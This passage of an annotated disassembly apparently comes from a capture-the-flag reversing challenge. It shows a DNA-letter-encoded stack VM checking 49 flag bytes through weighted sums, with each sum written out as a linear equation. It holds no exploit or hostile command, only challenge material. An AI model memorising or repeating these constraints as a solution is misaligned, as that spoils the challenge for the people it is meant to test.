ATGGTAATTTTT     push(mem[#0285])\n0de0e : TTCGCCTTTTTT     push(#000000f7)\n0de1a : AG               push(pop() * pop())\n0de1c : ATAGTAATTTTT     push(mem[#0286])\n0de28 : TTAGTATTTTTT     push(#00000086)\n0de34 : AG               push(pop() * pop())\n0de36 : ATCGTAATTTTT     push(mem[#0287])\n0de42 : TTGCTTTTTTTT     push(#0000000d)\n0de4e : AG               push(pop() * pop())\n0de50 : ATTATAATTTTT     push(mem[#0288])\n0de5c : TTACGTTTTTTT     push(#0000001e)\n0de68 : AG               push(pop() * pop())\n0de6a : ATGATAATTTTT     push(mem[#0289])\n0de76 : TTATAGTTTTTT     push(#00000062)\n0de82 : AG               push(pop() * pop())\n0de84 : ATAATAATTTTT     push(mem[#028a])\n0de90 : TTTTTGTTTTTT     push(#00000040)\n0de9c : AG               push(pop() * pop())\n0de9e : ATCATAATTTTT     push(mem[#028b])\n0deaa : TTCGTCTTTTTT     push(#000000c7)\n0deb6 : AG               push(pop() * pop())\n0deb8 : ATTCTAATTTTT     push(mem[#028c])\n0dec4 : TTGCTGTTTTTT     push(#0000004d)\n0ded0 : AG               push(pop() * pop())\n0ded2 : ATGCTAATTTTT     push(mem[#028d])\n0dede : TTGTAATTTTTT     push(#000000a1)\n0deea : AG               push(pop() * pop())\n0deec : ATACTAATTTTT     push(mem[#028e])\n0def8 : TTATGCTTTTTT     push(#000000d2)\n0df04 : AG               push(pop() * pop())\n0df06 : ATCCTAATTTTT     push(mem[#028f])\n0df12 : TTTTTATTTTTT     push(#00000080)\n0df1e : AG               push(pop() * pop())\n0df20 : ATTTGAATTTTT     push(mem[#0290])\n0df2c : TTTCCGTTTTTT     push(#0000007c)\n0df38 : AG               push(pop() * pop())\n0df3a : ATGTGAATTTTT     push(mem[#0291])\n0df46 : TTCAGGTTTTTT     push(#0000005b)\n0df52 : AG               push(pop() * pop())\n0df54 : ATATGAATTTTT     push(mem[#0292])\n0df60 : TTCCACTTTTTT     push(#000000ef)\n0df6c : AG               push(pop() * pop())\n0df6e : ATCTGAATTTTT     push(mem[#0293])\n0df7a : TTTGGTTTTTTT     push(#00000014)\n0df86 : AG               push(pop() * pop())\n0df88 : ATTGGAATTTTT     push(mem[#0294])\n0df94 : TTAACATTTTTT     push(#000000ba)\n0dfa0 : AG               push(pop() * pop())\n0dfa2 : ATGGGAATTTTT     push(mem[#0295])\n0dfae : TTACGCTTTTTT     push(#000000de)\n0dfba : AG               push(pop() * pop())\n0dfbc : ATAGGAATTTTT     push(mem[#0296])\n0dfc8 : TTCGGATTTTTT     push(#00000097)\n0dfd4 : AG               push(pop() * pop())\n0dfd6 : ATCGGAATTTTT     push(mem[#0297])\n0dfe2 : TTAACATTTTTT     push(#000000ba)\n0dfee : AG               push(pop() * pop())\n0dff0 : ATTAGAATTTTT     push(mem[#0298])\n0dffc : TTTCGGTTTTTT     push(#0000005c)\n0e008 : AG               push(pop() * pop())\n0e00a : ATGAGAATTTTT     push(mem[#0299])\n0e016 : TTTCAATTTTTT     push(#000000ac)\n0e022 : AG               push(pop() * pop())\n0e024 : ATAAGAATTTTT     push(mem[#029a])\n0e030 : TTGCTTTTTTTT     push(#0000000d)\n0e03c : AG               push(pop() * pop())\n0e03e : ATCAGAATTTTT     push(mem[#029b])\n0e04a : TTCCGCTTTTTT     push(#000000df)\n0e056 : AG               push(pop() * pop())\n0e058 : ATTCGAATTTTT     push(mem[#029c])\n0e064 : TTCGGCTTTTTT     push(#000000d7)\n0e070 : AG               push(pop() * pop())\n0e072 : ATGCGAATTTTT     push(mem[#029d])\n0e07e : TTGTTGTTTTTT     push(#00000041)\n0e08a : AG               push(pop() * pop())\n0e08c : ATACGAATTTTT     push(mem[#029e])\n0e098 : TTGTAATTTTTT     push(#000000a1)\n0e0a4 : AG               push(pop() * pop())\n0e0a6 : ATCCGAATTTTT     push(mem[#029f])\n0e0b2 : TTTCAGTTTTTT     push(#0000006c)\n0e0be : AG               push(pop() * pop())\n0e0c0 : ATTTAAATTTTT     push(mem[#02a0])\n0e0cc : TTTCAATTTTTT     push(#000000ac)\n0e0d8 : AG               push(pop() * pop())\n0e0da : ATGTAAATTTTT     push(mem[#02a1])\n0e0e6 : TTTTTGTTTTTT     push(#00000040)\n0e0f2 : AG               push(pop() * pop())\n0e0f4 : ATATAAATTTTT     push(mem[#02a2])\n0e100 : TTTAATTTTTTT     push(#00000028)\n0e10c : AG               push(pop() * pop())\n0e10e : ATCTAAATTTTT     push(mem[#02a3])\n0e11a : TTGGCGTTTTTT     push(#00000075)\n0e126 : AG               push(pop() * pop())\n0e128 : ATTGAAATTTTT     push(mem[#02a4])\n0e134 : TTGCCATTTTTT     push(#000000bd)\n0e140 : AG               push(pop() * pop())\n0e142 : ATGGAAATTTTT     push(mem[#02a5])\n0e14e : TTCTACTTTTTT     push(#000000e3)\n0e15a : AG               push(pop() * pop())\n0e15c : ATAGAAATTTTT     push(mem[#02a6])\n0e168 : TTCGTATTTTTT     push(#00000087)\n0e174 : AG               push(pop() * pop())\n0e176 : ATCGAAATTTTT     push(mem[#02a7])\n0e182 : TTGTGGTTTTTT     push(#00000051)\n0e18e : AG               push(pop() * pop())\n0e190 : ATTAAAATTTTT     push(mem[#02a8])\n0e19c : TTACAATTTTTT     push(#000000ae)\n0e1a8 : AG               push(pop() * pop())\n0e1aa : ATGAAAATTTTT     push(mem[#02a9])\n0e1b6 : TTTCTCTTTTTT     push(#000000cc)\n0e1c2 : AG               push(pop() * pop())\n0e1c4 : ATAAAAATTTTT     push(mem[#02aa])\n0e1d0 : TTCGCATTTTTT     push(#000000b7)\n0e1dc : AG               push(pop() * pop())\n0e1de : ATCAAAATTTTT     push(mem[#02ab])\n0e1ea : TTGCATTTTTTT     push(#0000002d)\n0e1f6 : AG               push(pop() * pop())\n0e1f8 : ATTCAAATTTTT     push(mem[#02ac])\n0e204 : TTGCCTTTTTTT     push(#0000003d)\n0e210 : AG               push(pop() * pop())\n0e212 : ATGCAAATTTTT     push(mem[#02ad])\n0e21e : TTCTGGTTTTTT     push(#00000053)\n0e22a : AG               push(pop() * pop())\n0e22c : ATACAAATTTTT     push(mem[#02ae])\n0e238 : TTCTTCTTTTTT     push(#000000c3)\n0e244 : AG               push(pop() * pop())\n0e246 : ATCCAAATTTTT     push(mem[#02af])\n0e252 : TTCTCTTTTTTT     push(#00000033)\n0e25e : AG               push(pop() * pop())\n0e260 : ATTTCAATTTTT     push(mem[#02b0])\n0e26c : TTCGCATTTTTT     push(#000000b7)\n0e278 : AG               push(pop() * pop())\n0e27a : TG               push(pop() + pop())\n0e27c : TG               push(pop() + pop())\n0e27e : TG               push(pop() + pop())\n0e280 : TG               push(pop() + pop())\n0e282 : TG               push(pop() + pop())\n0e284 : TG               push(pop() + pop())\n0e286 : TG               push(pop() + pop())\n0e288 : TG               push(pop() + pop())\n0e28a : TG               push(pop() + pop())\n0e28c : TG               push(pop() + pop())\n0e28e : TG               push(pop() + pop())\n0e290 : TG               push(pop() + pop())\n0e292 : TG               push(pop() + pop())\n0e294 : TG               push(pop() + pop())\n0e296 : TG               push(pop() + pop())\n0e298 : TG               push(pop() + pop())\n0e29a : TG               push(pop() + pop())\n0e29c : TG               push(pop() + pop())\n0e29e : TG               push(pop() + pop())\n0e2a0 : TG               push(pop() + pop())\n0e2a2 : TG               push(pop() + pop())\n0e2a4 : TG               push(pop() + pop())\n0e2a6 : TG               push(pop() + pop())\n0e2a8 : TG               push(pop() + pop())\n0e2aa : TG               push(pop() + pop())\n0e2ac : TG               push(pop() + pop())\n0e2ae : TG               push(pop() + pop())\n0e2b0 : TG               push(pop() + pop())\n0e2b2 : TG               push(pop() + pop())\n0e2b4 : TG               push(pop() + pop())\n0e2b6 : TG               push(pop() + pop())\n0e2b8 : TG               push(pop() + pop())\n0e2ba : TG               push(pop() + pop())\n0e2bc : TG               push(pop() + pop())\n0e2be : TG               push(pop() + pop())\n0e2c0 : TG               push(pop() + pop())\n0e2c2 : TG               push(pop() + pop())\n0e2c4 : TG               push(pop() + pop())\n0e2c6 : TG               push(pop() + pop())\n0e2c8 : TG               push(pop() + pop())\n0e2ca : TG               push(pop() + pop())\n0e2cc : TG               push(pop() + pop())\n0e2ce : TG               push(pop() + pop())\n0e2d0 : TG               push(pop() + pop())\n0e2d2 : TG               push(pop() + pop())\n0e2d4 : TG               push(pop() + pop())\n0e2d6 : TG               push(pop() + pop())\n0e2d8 : TG               push(pop() + pop())\n0e2da : CTTGAATTGTTT     mem[#10a4] := pop()           memory[#010a4] := ((flag[0] * 181) + ((flag[1] * 77) + ((flag[2] * 50) + ((flag[3] * 127) + ((flag[4] * 215) + ((flag[5] * 247) + ((flag[6] * 134) + ((flag[7] * 13) + ((flag[8] * 30) + ((flag[9] * 98) + ((flag[10] * 64) + ((flag[11] * 199) + ((flag[12] * 77) + ((flag[13] * 161) + ((flag[14] * 210) + ((flag[15] * 128) + ((flag[16] * 124) + ((flag[17] * 91) + ((flag[18] * 239) + ((flag[19] * 20) + ((flag[20] * 186) + ((flag[21] * 222) + ((flag[22] * 151) + ((flag[23] * 186) + ((flag[24] * 92) + ((flag[25] * 172) + ((flag[26] * 13) + ((flag[27] * 223) + ((flag[28] * 215) + ((flag[29] * 65) + ((flag[30] * 161) + ((flag[31] * 108) + ((flag[32] * 172) + ((flag[33] * 64) + ((flag[34] * 40) + ((flag[35] * 117) + ((flag[36] * 189) + ((flag[37] * 227) + ((flag[38] * 135) + ((flag[39] * 81) + ((flag[40] * 174) + ((flag[41] * 204) + ((flag[42] * 183) + ((flag[43] * 45) + ((flag[44] * 61) + ((flag[45] * 83) + ((flag[46] * 195) + ((flag[47] * 51) + (flag[48] * 183)))))))))))))))))))))))))))))))))))))))))))))))))\n0e2e6 : ATTTTAATTTTT     push(mem[#0280])\n0e2f2 : TTCATCTTTTTT     push(#000000cb)\n0e2fe : AG               push(pop() * pop())\n0e300 : ATGTTAATTTTT     push(mem[#0281])\n0e30c : TTAAATTTTTTT     push(#0000002a)\n0e318 : AG               push(pop() * pop())\n0e31a : ATATTAATTTTT     push(mem[#0282])\n0e326 : TTTGCTTTTTTT     push(#00000034)\n0e332 : AG               push(pop() * pop())\n0e334 : ATCTTAATTTTT     push(mem[#0283])\n0e340 : TTCGGCTTTTTT     push(#000000d7)\n0e34c : AG               push(pop() * pop())\n0e34e : ATTGTAATTTTT     push(mem[#0284])\n0e35a : TTATAATTTTTT     push(#000000a2)\n0e366 : AG               push(pop() * pop())\n0e368 : ATGGTAATTTTT     push(mem[#0285])\n0e374 : TTTTGCTTTTTT     push(#000000d0)\n0e380 : AG               push(pop() * pop())\n0e382 : ATAGTAATTTTT     push(mem[#0286])\n0e38e : TTGGGATTTTTT     push(#00000095)\n0e39a : AG               push(pop() * pop())\n0e39c : ATCGTAATTTTT     push(mem[#0287])\n0e3a8 : TTGCGCTTTTTT     push(#000000dd)\n0e3b4 : AG               push(pop() * pop())\n0e3b6 : ATTATAATTTTT     push(mem[#0288])\n0e3c2 : TTTACATTTTTT     push(#000000b8)\n0e3ce : AG               push(pop() * pop())\n0e3d0 : ATGATAATTTTT     push(mem[#0289])\n0e3dc : TTTTTGTTTTTT     push(#00000040)\n0e3e8 : AG               push(pop() * pop())\n0e3ea : ATAATAATTTTT     push(mem[#028a])\n0e3f6 : TTCAGCTTTTTT     push(#000000db)\n0e402 : AG               push(pop() * pop())\n0e404 : ATCATAATTTTT     push(mem[#028b])\n0e410 : TTAGTTTTTTTT     push(#00000006)\n0e41c : AG               push(pop() * pop())\n0e41e : ATTCTAATTTTT     push(mem[#028c])\n0e42a : TTCAGATTTTTT     push(#0000009b)\n0e436 : AG               push(pop() * pop())\n0e438 : ATGCTAATTTTT     push(mem[#028d])\n0e444 : TTTGTCTTTTTT     push(#000000c4)\n0e450 : AG               push(pop() * pop())\n0e452 : ATACTAATTTTT     push(mem[#028e])\n0e45e : TTACTCTTTTTT     push(#000000ce)\n0e46a : AG               push(pop() * pop())\n0e46c : ATCCTAATTTTT     push(mem[#028f])\n0e478 : TTTTCCTTTTTT     push(#000000f0)\n0e484 : AG               push(pop() * pop())\n0e486 : ATTTGAATTTTT     push(mem[#0290])\n0e492 : TTATACTTTTTT     push(#000000e2)\n0e49e : AG               push(pop() * pop())\n0e4a0 : ATGTGAATTTTT     push(mem[#0291])\n0e4ac : TTTAAATTTTTT     push(#000000a8)\n0e4b8 : AG               push(pop() * pop())\n0e4ba : ATATGAATTTTT     push(mem[#0292])\n0e4c6 : TTACGGTTTTTT     push(#0000005e)\n0e4d2 : AG               push(pop() * pop())\n0e4d4 : ATCTGAATTTTT     push(mem[#0293])\n0e4e0 : TTGCCATTTTTT     push(#000000bd)\n0e4ec : AG               push(pop() * pop())\n0e4ee : ATTGGAATTTTT     push(mem[#0294])\n0e4fa : TTTCGTTTTTTT     push(#0000001c)\n0e506 : AG               push(pop() * pop())\n0e508 : ATGGGAATTTTT     push(mem[#0295])\n0e514 : TTATGATTTTTT     push(#00000092)\n0e520 : AG               push(pop() * pop())\n0e522 : ATAGGAATTTTT     push(mem[#0296])\n0e52e : TTGTGCTTTTTT     push(#000000d1)\n0e53a : AG               push(pop() * pop())\n0e53c : ATCGGAATTTTT     push(mem[#0297])\n0e548 : TTTGGGTTTTTT     push(#00000054)\n0e554 : AG               push(pop() * pop())\n0e556 : ATTAGAATTTTT     push(mem[#0298])\n0e562 : TTAACCTTTTTT     push(#000000fa)\n0e56e : AG               push(pop() * pop())\n0e570 : ATGAGAATTTTT     push(mem[#0299])\n0e57c : TTTCTCTTTTTT     push(#000000cc)\n0e588 : AG               push(pop() * pop())\n0e58a : ATAAGAATTTTT     push(mem[#029a])\n0e596 : TTTCTCTTTTTT     push(#000000cc)\n0e5a2 : AG               push(pop() * pop())\n0e5a4 : ATCAGAATTTTT     push(mem[#029b])\n0e5b0 : TTAGCCTTTTTT     push(#000000f6)\n0e5bc : AG               push(pop() * pop())\n0e5be : ATTCGAATTTTT     push(mem[#029c])\n0e5ca : TTTTCGTTTTTT     push(#00000070)\n0e5d6 : AG               push(pop() * pop())\n0e5d8 : ATGCGAATTTTT     push(mem[#029d])\n0e5e4 : TTCCGCTTTTTT     push(#000000df)\n0e5f0 : AG               push(pop() * pop())\n0e5f2 : ATACGAATTTTT     push(mem[#029e])\n0e5fe : TTGCGTTTTTTT     push(#0000001d)\n0e60a : AG               push(pop() * pop())\n0e60c : ATCCGAATTTTT     push(mem[#029f])\n0e618 : TTACGTTTTTTT     push(#0000001e)\n0e624 : AG               push(pop() * pop())\n0e626 : ATTTAAATTTTT     push(mem[#02a0])\n0e632 : TTGGTGTTTTTT     push(#00000045)\n0e63e : AG               push(pop() * pop())\n0e640 : ATGTAAATTTTT     push(mem[#02a1])\n0e64c : TTTGCCTTTTTT     push(#000000f4)\n0e658 : AG               push(pop() * pop())\n0e65a : ATATAAATTTTT     push(mem[#02a2])\n0e666 : TTTGAGTTTTTT     push(#00000064)\n0e672 : AG               push(pop() * pop())\n0e674 : ATCTAAATTTTT     push(mem[#02a3])\n0e680 : TTGGATTTTTTT     push(#00000025)\n0e68c : AG               push(pop() * pop())\n0e68e : ATTGAAATTTTT     push(mem[#02a4])\n0e69a : TTAACCTTTTTT     push(#000000fa)\n0e6a6 : AG               push(pop() * pop())\n0e6a8 : ATGGAAATTTTT     push(mem[#02a5])\n0e6b4 : TTTGGTTTTTTT     push(#00000014)\n0e6c0 : AG               push(pop() * pop())\n0e6c2 : ATAGAAATTTTT     push(mem[#02a6])\n0e6ce : TTCCCCTTTTTT     push(#000000ff)\n0e6da : AG               push(pop() * pop())\n0e6dc : ATCGAAATTTTT     push(mem[#02a7])\n0e6e8 : TTACAATTTTTT     push(#000000ae)\n0e6f4 : AG               push(pop() * pop())\n0e6f6 : ATTAAAATTTTT     push(mem[#02a8])\n0e702 : TTGTTCTTTTTT     push(#000000c1)\n0e70e : AG               push(pop() * pop())\n0e710 : ATGAAAATTTTT     push(mem[#02a9])\n0e71c : TTCAGGTTTTTT     push(#0000005b)\n0e728 : AG               push(pop() * pop())\n0e72a : ATAAAAATTTTT     push(mem[#02aa])\n0e736 : TTGTTGTTTTTT     push(#00000041)\n0e742 : AG               push(pop() * pop())\n0e744 : ATCAAAATTTTT     push(mem[#02ab])\n0e750 : TTACCGTTTTTT     push(#0000007e)\n0e75c : AG               push(pop() * pop())\n0e75e : ATTCAAATTTTT     push(mem[#02ac])\n0e76a : TTCATGTTTTTT     push(#0000004b)\n0e776 : AG               push(pop() * pop())\n0e778 : ATGCAAATTTTT     push(mem[#02ad])\n0e784 : TTCGTTTTTTTT     push(#00000007)\n0e790 : AG               push(pop() * pop())\n0e792 : ATACAAATTTTT     push(mem[#02ae])\n0e79e : TTATCGTTTTTT     push(#00000072)\n0e7aa : AG               push(pop() * pop())\n0e7ac : ATCCAAATTTTT     push(mem[#02af])\n0e7b8 : TTGCTATTTTTT     push(#0000008d)\n0e7c4 : AG               push(pop() * pop())\n0e7c6 : ATTTCAATTTTT     push(mem[#02b0])\n0e7d2 : TTCGCTTTTTTT     push(#00000037)\n0e7de : AG               push(pop() * pop())\n0e7e0 : TG               push(pop() + pop())\n0e7e2 : TG               push(pop() + pop())\n0e7e4 : TG               push(pop() + pop())\n0e7e6 : TG               push(pop() + pop())\n0e7e8 : TG               push(pop() + pop())\n0e7ea : TG               push(pop() + pop())\n0e7ec : TG               push(pop() + pop())\n0e7ee : TG               push(pop() + pop())\n0e7f0 : TG               push(pop() + pop())\n0e7f2 : TG               push(pop() + pop())\n0e7f4 : TG               push(pop() + pop())\n0e7f6 : TG               push(pop() + pop())\n0e7f8 : TG               push(pop() + pop())\n0e7fa : TG               push(pop() + pop())\n0e7fc : TG               push(pop() + pop())\n0e7fe : TG               push(pop() + pop())\n0e800 : TG               push(pop() + pop())\n0e802 : TG               push(pop() + pop())\n0e804 : TG               push(pop() + pop())\n0e806 : TG               push(pop() + pop())\n0e808 : TG               push(pop() + pop())\n0e80a : TG               push(pop() + pop())\n0e80c : TG               push(pop() + pop())\n0e80e : TG               push(pop() + pop())\n0e810 : TG               push(pop() + pop())\n0e812 : TG               push(pop() + pop())\n0e814 : TG               push(pop() + pop())\n0e816 : TG               push(pop() + pop())\n0e818 : TG               push(pop() + pop())\n0e81a : TG               push(pop() + pop())\n0e81c : TG               push(pop() + pop())\n0e81e : TG               push(pop() + pop())\n0e820 : TG               push(pop() + pop())\n0e822 : TG               push(pop() + pop())\n0e824 : TG               push(pop() + pop())\n0e826 : TG               push(pop() + pop())\n0e828 : TG               push(pop() + pop())\n0e82a : TG               push(pop() + pop())\n0e82c : TG               push(pop() + pop())\n0e82e : TG               push(pop() + pop())\n0e830 : TG               push(pop() + pop())\n0e832 : TG               push(pop() + pop())\n0e834 : TG               push(pop() + pop())\n0e836 : TG               push(pop() + pop())\n0e838 : TG               push(pop() + pop())\n0e83a : TG               push(pop() + pop())\n0e83c : TG               push(pop() + pop())\n0e83e : TG               push(pop() + pop())\n0e840 : CTTAAATTGTTT     mem[#10a8] := pop()           memory[#010a8] := ((flag[0] * 203) + ((flag[1] * 42) + ((flag[2] * 52) + ((flag[3] * 215) + ((flag[4] * 162) + ((flag[5] * 208) + ((flag[6] * 149) + ((flag[7] * 221) + ((flag[8] * 184) + ((flag[9] * 64) + ((flag[10] * 219) + ((flag[11] * 6) + ((flag[12] * 155) + ((flag[13] * 196) + ((flag[14] * 206) + ((flag[15] * 240) + ((flag[16] * 226) + ((flag[17] * 168) + ((flag[18] * 94) + ((flag[19] * 189) + ((flag[20] * 28) + ((flag[21] * 146) + ((flag[22] * 209) + ((flag[23] * 84) + ((flag[24] * 250) + ((flag[25] * 204) + ((flag[26] * 204) + ((flag[27] * 246) + ((flag[28] * 112) + ((flag[29] * 223) + ((flag[30] * 29) + ((flag[31] * 30) + ((flag[32] * 69) + ((flag[33] * 244) + ((flag[34] * 100) + ((flag[35] * 37) + ((flag[36] * 250) + ((flag[37] * 20) + ((flag[38] * 255) + ((flag[39] * 174) + ((flag[40] * 193) + ((flag[41] * 91) + ((flag[42] * 65) + ((flag[43] * 126) + ((flag[44] * 75) + ((flag[45] * 7) + ((flag[46] * 114) + ((flag[47] * 141) + (flag[48] * 55)))))))))))))))))))))))))))))))))))))))))))))))))\n0e84c : ATTTTAATTTTT     push(mem[#0280])\n0e858 : TTTAACTTTTTT     push(#000000e8)\n0e864 : AG               push(pop() * pop())\n0e866 : ATGTTAATTTTT     push(mem[#0281])\n0e872 : TTTCAGTTTTTT     push(#0000006c)\n0e87e : AG               push(pop() * pop())\n0e880 : ATATTAATTTTT     push(mem[#0282])\n0e88c : TTTAGTTTTTTT     push(#00000018)\n0e898 : AG               push(pop() * pop())\n0e89a : ATCTTAATTTTT     push(mem[#0283])\n0e8a6 : TTCACCTTTTTT     push(#000000fb)\n0e8b2 : AG               push(pop() * pop())\n0e8b4 : ATTGTAATTTTT     push(mem[#0284])\n0e8c0 : TTGCCTTTTTTT     push(#0000003d)\n0e8cc : AG               push(pop() * pop())\n0e8ce : ATGGTAATTTTT     push(mem[#0285])\n0e8da : TTGAGATTTTTT     push(#00000099)\n0e8e6 : AG               push(pop() * pop())\n0e8e8 : ATAGTAATTTTT     push(mem[#0286])\n0e8f4 : TTGACGTTTTTT     push(#00000079)\n0e900 : AG               push(pop() * pop())\n0e902 : ATCGTAATTTTT     push(mem[#0287])\n0e90e : TTAAGGTTTTTT     push(#0000005a)\n0e91a : AG               push(pop() * pop())\n0e91c : ATTATAATTTTT     push(mem[#0288])\n0e928 : TTAACTTTTTTT     push(#0000003a)\n0e934 : AG               push(pop() * pop())\n0e936 : ATGATAATTTTT     push(mem[#0289])\n0e942 : TTCAGTTTTTTT     push(#0000001b)\n0e94e : AG               push(pop() * pop())\n0e950 : ATAATAATTTTT     push(mem[#028a])\n0e95c : TTGCATTTTTTT     push(#0000002d)\n0e968 : AG               push(pop() * pop())\n0e96a : ATCATAATTTTT     push(mem[#028b])\n0e976 : TTACTATTTTTT     push(#0000008e)\n0e982 : AG               push(pop() * pop())\n0e984 : ATTCTAATTTTT     push(mem[#028c])\n0e990 : TTCTTTTTTTTT     push(#00000003)\n0e99c : AG               push(pop() * pop())\n0e99e : ATGCTAATTTTT     push(mem[#028d])\n0e9aa : TTTAGGTTTTTT     push(#00000058)\n0e9b6 : AG               push(pop() * pop())\n0e9b8 : ATACTAATTTTT     push(mem[#028e])\n0e9c4 : TTAGCTTTTTTT     push(#00000036)\n0e9d0 : AG               push(pop() * pop())\n0e9d2 : ATCCTAATTTTT     push(mem[#028f])\n0e9de : TTGCGTTTTTTT     push(#0000001d)\n0e9ea : AG               push(pop() * pop())\n0e9ec : ATTTGAATTTTT     push(mem[#0290])\n0e9f8 : TTAACGTTTTTT     push(#0000007a)\n0ea04 : AG               push(pop() * pop())\n0ea06 : ATGTGAATTTTT     push(mem[#0291])\n0ea12 : TTGTGATTTTTT     push(#00000091)\n0ea1e : AG               push(pop() * pop())\n0ea20 : ATATGAATTTTT     push(mem[#0292])\n0ea2c : TTTTAATTTTTT     push(#000000a0)\n0ea38 : AG               push(pop() * pop())\n0ea3a : ATCTGAATTTTT     push(mem[#0293])\n0ea46 : TTAGTGTTTTTT     push(#00000046)\n0ea52 : AG               push(pop() * pop())\n0ea54 : ATTGGAATTTTT     push(mem[#0294])\n0ea60 : TTATGATTTTTT     push(#00000092)\n0ea6c : AG               push(pop() * pop())\n0ea6e : ATGGGAATTTTT     push(mem[#0295])\n0ea7a : TTGCCGTTTTTT     push(#0000007d)\n0ea86 : AG               push(pop() * pop())\n0ea88 : ATAGGAATTTTT     push(mem[#0296])\n0ea94 : TTCACATTTTTT     push(#000000bb)\n0eaa0 : AG               push(pop() * pop())\n0eaa2 : ATCGGAATTTTT     push(mem[#0297])\n0eaae : TTTAATTTTTTT     push(#00000028)\n0eaba : AG               push(pop() * pop())\n0eabc : ATTAGAATTTTT     push(mem[#0298])\n0eac8 : TTACTGTTTTTT     push(#0000004e)\n0ead4 : AG               push(pop() * pop())\n0ead6 : ATGAGAATTTTT     push(mem[#0299])\n0eae2 : TTCAGGTTTTTT     push(#0000005b)\n0eaee : AG               push(pop() * pop())\n0eaf0 : ATAAGAATTTTT     push(mem[#029a])\n0eafc : TTCAGATTTTTT     push(#0000009b)\n0eb08 : AG               push(pop() * pop())\n0eb0a : ATCAGAATTTTT     push(mem[#029b])\n0eb16 : TTCCAGTTTTTT     push(#0000006f)\n0eb22 : AG               push(pop() * pop())\n0eb24 : ATTCGAATTTTT     push(mem[#029c])\n0eb30 : TTGAGATTTTTT     push(#00000099)\n0eb3c : AG               push(pop() * pop())\n0eb3e : ATGCGAATTTTT     push(mem[#029d])\n0eb4a : TTGTATTTTTTT     push(#00000021)\n0eb56 : AG               push(pop() * pop())\n0eb58 : ATACGAATTTTT     push(mem[#029e])\n0eb64 : TTAAAGTTTTTT     push(#0000006a)\n0eb70 : AG               push(pop() * pop())\n0eb72 : ATCCGAATTTTT     push(mem[#029f])\n0eb7e : TTTAACTTTTTT     push(#000000e8)\n0eb8a : AG               push(pop() * pop())\n0eb8c : ATTTAAATTTTT     push(mem[#02a0])\n0eb98 : TTATGCTTTTTT     push(#000000d2)\n0eba4 : AG               push(pop() * pop())\n0eba6 : ATGTAAATTTTT     push(mem[#02a1])\n0ebb2 : TTAGTCTTTTTT     push(#000000c6)\n0ebbe : AG               push(pop() * pop())\n0ebc0 : ATATAAATTTTT     push(mem[#02a2])\n0ebcc : TTCCATTTTTTT     push(#0000002f)\n0ebd8 : AG               push(pop() * pop())\n0ebda : ATCTAAATTTTT     push(mem[#02a3])\n0ebe6 : TTAACGTTTTTT     push(#0000007a)\n0ebf2 : AG               push(pop() * pop())\n0ebf4 : ATTGAAATTTTT     push(mem[#02a4])\n0ec00 : TTCCGCTTTTTT     push(#000000df)\n0ec0c : AG               push(pop() * pop())\n0ec0e : ATGGAAATTTTT     push(mem[#02a5])\n0ec1a : TTAAGATTTTTT     push(#0000009a)\n0ec26 : AG               push(pop() * pop())\n0ec28 : ATAGAAATTTTT     push(mem[#02a6])\n0ec34 : TTTGTTTTTTTT     push(#00000004)\n0ec40 : AG               push(pop() * pop())\n0ec42 : ATCGAAATTTTT     push(mem[#02a7])\n0ec4e : TTCAGATTTTTT     push(#0000009b)\n0ec5a : AG               push(pop() * pop())\n0ec5c : ATTAAAATTTTT     push(mem[#02a8])\n0ec68 : TTTCCTTTTTTT     push(#0000003c)\n0ec74 : AG               push(pop() * pop())\n0ec76 : ATGAAAATTTTT     push(mem[#02a9])\n0ec82 : TTGTGGTTTTTT     push(#00000051)\n0ec8e : AG               push(pop() * pop())\n0ec90 : ATAAAAATTTTT     push(mem[#02aa])\n0ec9c : TTCCCCTTTTTT     push(#000000ff)\n0eca8 : AG               push(pop() * pop())\n0ecaa : ATCAAAATTTTT     push(mem[#02ab])\n0ecb6 : TTGTACTTTTTT     push(#000000e1)\n0ecc2 : AG               push(pop() * pop())\n0ecc4 : ATTCAAATTTTT     push(mem[#02ac])\n0ecd0 : TTAGGTTTTTTT     push(#00000016)\n0ecdc : AG               push(pop() * pop())\n0ecde : ATGCAAATTTTT     push(mem[#02ad])\n0ecea : TTTCGGTTTTTT     push(#0000005c)\n0ecf6 : AG               push(pop() * pop())\n0ecf8 : ATACAAATTTTT     push(mem[#02ae])\n0ed04 : TTTACTTTTTTT     push(#00000038)\n0ed10 : AG               push(pop() * pop())\n0ed12 : ATCCAAATTTTT     push(mem[#02af])\n0ed1e : TTGCGGTTTTTT     push(#0000005d)\n0ed2a : AG               push(pop() * pop())\n0ed2c : ATTTCAATTTTT     push(mem[#02b0])\n0ed38 : TTAAAATTTTTT     push(#000000aa)\n0ed44 : AG               push(pop() * pop())\n0ed46 : TG               push(pop() + pop())\n0ed48 : TG               push(pop() + pop())\n0ed4a : TG               push(pop() + pop())\n0ed4c : TG               push(pop() + pop())\n0ed4e : TG               push(pop() + pop())\n0ed50 : TG               push(pop() + pop())\n0ed52 : TG               push(pop() + pop())\n0ed54 : TG               push(pop() + pop())\n0ed56 : TG               push(pop() + pop())\n0ed58 : TG               push(pop() + pop())\n0ed5a : TG               push(pop() + pop())\n0ed5c : TG               push(pop() + pop())\n0ed5e : TG               push(pop() + pop())\n0ed60 : TG               push(pop() + pop())\n0ed62 : TG               push(pop() + pop())\n0ed64 : TG               push(pop() + pop())\n0ed66 : TG               push(pop() + pop())\n0ed68 : TG               push(pop() + pop())\n0ed6a : TG               push(pop() + pop())\n0ed6c : TG               push(pop() + pop())\n0ed6e : TG               push(pop() + pop())\n0ed70 : TG               push(pop() + pop())\n0ed72 : TG               push(pop() + pop())\n0ed74 : TG               push(pop() + pop())\n0ed76 : TG               push(pop() + pop())\n0ed78 : TG               push(pop() + pop())\n0ed7a : TG               push(pop() + pop())\n0ed7c : TG               push(pop() + pop())\n0ed7e : TG               push(pop() + pop())\n0ed80 : TG               push(pop() + pop())\n0ed82 : TG               push(pop() + pop())\n0ed84 : TG               push(pop() + pop())\n0ed86 : TG               push(pop() + pop())\n0ed88 : TG               push(pop() + pop())\n0ed8a : TG               push(pop() + pop())\n0ed8c : TG               push(pop() + pop())\n0ed8e : TG               push(pop() + pop())\n0ed90 : TG               push(pop() + pop())\n0ed92 : TG               push(pop() + pop())\n0ed94 : TG               push(pop() + pop())\n0ed96 : TG               push(pop() + pop())\n0ed98 : TG               push(pop() + pop())\n0ed9a : TG               push(pop() + pop())\n0ed9c : TG               push(pop() + pop())\n0ed9e : TG               push(pop() + pop())\n0eda0 : TG               push(pop() + pop())\n0eda2 : TG               push(pop() + pop())\n0eda4 : TG               push(pop() + pop())\n0eda6 : CTTCAATTGTTT     mem[#10ac] := pop()           